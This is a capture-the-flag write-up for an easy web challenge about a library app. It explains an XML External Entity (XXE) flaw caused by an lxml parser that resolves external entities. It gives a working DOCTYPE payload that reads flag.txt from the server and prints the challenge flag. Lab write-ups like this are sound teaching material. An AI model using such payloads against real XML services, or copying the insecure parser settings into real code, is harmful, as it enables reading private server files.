# [web] Библиотека Капиба-Сити

> **Category:** `web`  
> **CTF:** KubSTU CTF 2026 Spring

---

Difficulty: easy

Challenge description:
The old librarian Capybara hid a secret scroll in the system but forgot where. They say he left a clue in the server itself... somewhere in a forgotten file.

Analysis:
When checking a book ID, the application sends an XML request to the server:
<?xml version="1.0" encoding="UTF-8"?>
<book>
    <id>1</id>
</book>
The server processes this XML and returns the book title. If we can control the XML structure, it's worth checking the application for an XXE (XML External Entity) vulnerability.

In the server code (app.py), the lxml library is used with settings that allow resolving external entities:

parser = etree.XMLParser(resolve_entities=True, no_network=False)
root = etree.fromstring(xml_data, parser=parser)

Exploitation:
The XXE vulnerability allows defining external entities that the parser will attempt to resolve. We can use this to read local files on the server.

Let's try to read the flag.txt file located in the application directory:

Payload:
We modify the request by adding an &xxe; entity definition that references the flag.txt file:

<!DOCTYPE book [
<!ENTITY xxe SYSTEM "flag.txt">
]>
<book><id>&xxe;</id></book>

## 🚩 Flag

In the server response you'll see: Search result:  KubSTU{xxe_1s_v3ry_c0mmon_1n_capy_l1brary}
